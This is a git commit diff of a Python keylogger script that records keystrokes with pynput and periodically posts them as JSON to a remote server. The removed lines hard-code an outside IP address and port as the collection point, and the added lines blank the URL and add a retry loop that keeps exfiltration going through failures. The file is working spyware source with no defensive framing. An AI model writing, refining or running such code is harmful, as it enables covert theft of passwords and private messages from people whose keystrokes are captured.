9c2bfe99d6fb200d1136cefa0c6fcd2d1d8809fc
marte <166244789+ff3kv@users.noreply.github.com>
2026-04-19 19:33:24 -0400

    Update keylogger.py
    ...

--- keylogger.py
+++ keylogger.py
@@ -1,38 +1,23 @@
-# Install pynput using the following command: pip install pynput
-# Import the mouse and keynboard from pynput
 from pynput import keyboard
-# We need to import the requests library to Post the data to the server.
 import requests
-# To transform a Dictionary to a JSON string we need the json package.
 import json
-#  The Timer module is part of the threading package.
 import threading
+import time
 
-# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
 text = ""
-
-# Hard code the values of your server and ip address here.
-ip_address = "109.74.200.23"
-port_number = "8080"
-# Time interval in seconds for code to execute.
+url = "" #-> alteration
 time_interval = 10
 
 def send_post_req():
-    try:
-        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
-        # the format {"keyboardData" : "<value_of_text>"}
-        payload = json.dumps({"keyboardData" : text})
-        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
-        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
-        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
-        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
-        timer = threading.Timer(time_interval, send_post_req)
-        # We start the timer thread.
-        timer.start()
-    except:
-        print("Couldn't complete request!")
+    while True:
+        try:
+            payload = json.dumps({"keyboardData" : text})
+            r = requests.post(url, data=payload, headers={"Content-Type" : "application/json"})
+            timer = threading.Timer(time_interval, send_post_req)
+            timer.start()
+            break
+        except: time.sleep(1)
 
-# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
 def on_press(key):
     global text
 
